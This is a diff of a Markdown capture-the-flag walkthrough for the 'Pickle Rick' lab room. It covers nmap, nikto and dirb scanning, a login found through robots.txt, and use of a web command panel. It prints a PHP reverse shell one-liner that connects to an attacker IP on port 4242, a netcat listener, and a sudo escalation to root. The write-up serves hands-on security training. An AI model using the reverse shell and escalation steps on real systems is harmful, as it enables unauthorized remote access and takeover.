@@ -15,15 +15,18 @@ Find your ip address by going to `ip address| grep inet` take a note of it or sa
 
 ## Scanning and Enumeration
 ![IMG3](Images/img3.png "Figure-3") 
+
 To begin you are giving an IP address to go to. Launching it you will see a website, we can see that the message on the web is asking to look for a password. So with this knowledge we need to look for login credentials and a login portal. 
 
 *Note: Replace $Attack_IP with the target ip* 
 Lets go ahead and run an nmap scan, I run a simple nmap scan but you can run with any parameter you like.
 `nmap -A -sT $Attack_IP` 
+
 ![IMG4](Images/img4.png "Figure-4") 
 
 After few seconds we can see two ports that are open 80(http) and 22(ssh). Now we will scan for more and see what else we ccan find. Lets run nikto and dirbuster at the same time on two different terminal.
 `nikto -h $Attack_IP` `dirb http://$Attack_IP`
+
 ![IMG5](Images/img5.png "Figure-5") 
 
 Quite interesting, we find a robot.txt during from our dirbuster scanning, and we were able to find out how to get into the login portal. 
@@ -47,14 +50,15 @@ Entering the credentials we have now gain access to the portal.
 
 Now that we are in, lets browse around. From here we can only see that the command panel is the only revelant thing we can do. With a simple `ls` command we can see a list of files in here. 
 HEY LOOK! There is one of the secret ingredient. Trying to use commands to open the text is a no go. So how do we do it. There are three ways:
-![IMG7](Images/img27.png "Figure-7") 
+
+![IMG7](Images/img7.png "Figure-7") 
 
 ```c
 First Option: Using grep command. We can recursively grab everything. Command: grep -R .
 Second Option: We can type it in our url http://$Attack_IP/Sup3rS3cretPickl3Ingred.txt
 Third Option: Using a reverse shell we will try to gain access and navigate through their system.
 ```
-You can pick whichever option. If you chosen the first option, you can view the page source of what you find. You will find not really an eaaster egg but a base64 code. Which you will have to base64 it over and over only until you get a hidden message. <br>
+You can pick whichever option. If you chosen the first option, you can view the page source of what you find. You will find not really an easter egg but a base64 code. Which you will have to base64 it over and over only until you get a hidden message. <br>
 Second option will tell you the answer and thats it.<br>
 However the third option would be more beneficial as it will help us gain access to the 2nd and 3rd ingredients. 
 
@@ -64,13 +68,15 @@ However the third option would be more beneficial as it will help us gain access
 You can do a reverse shell of your choice, if you do not know where or how to create a reverse shell here is the link to one: [Reverse Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 I found that the php reverse shell script worked fine after modifying the IP and/or port number.
 
-`php -r '$sock=fsockopen("10.10.151.177",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`
+`php -r '$sock=fsockopen("10.10.151.177",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`<br>
 *Note: You may have to use python3 instead of python if it doesn't work*
 
 ![IMG8](Images/img8.png "Figure-8") 
+
 Now copy and paste into the Command box, but do not execute it just yet. Next open a terminal and launch a netcat listener `nc -lvnp 4242`, my port number is 4242 yours could be different if you changed it.
 
 Now we are in, at this point if you were to do `pwd` you find that we are in \var\www\html. We will want to go to the root directory. So go ahead and cd to \. 
+
 ![IMG9](Images/img9.png "Figure-9") 
 
 Then you want to `ls -la` to see all the folder/files/directory. Go ahead and browser around. You will find that the /home directory has a user in it call 'Rick', going into this directory, if we type `ls`, we see the second ingredient. Go ahead and open it and now its time to find the last ingredient. 
@@ -78,7 +84,9 @@ Then you want to `ls -la` to see all the folder/files/directory. Go ahead and br
 ## Escalation Priviledge
 At this point we have browse everywhere to find the third ingredient, however there is one place we cannot get into which is root. So we need to be the root user. Typing in `sudo -l` we try to see if we are root. 
 Oh no it does not work. What about `sudo su`? Yes it works, using `whoami` I can see that I am root.
+
 ![IMG10](Images/img10.png "Figure-10") 
+
 Now we will go into the root directory and we can see the third text file. Looking into it we got our last ingredient.
 
-We have completed the Ricky and Morty Room!
+# We have completed the Ricky and Morty Room!
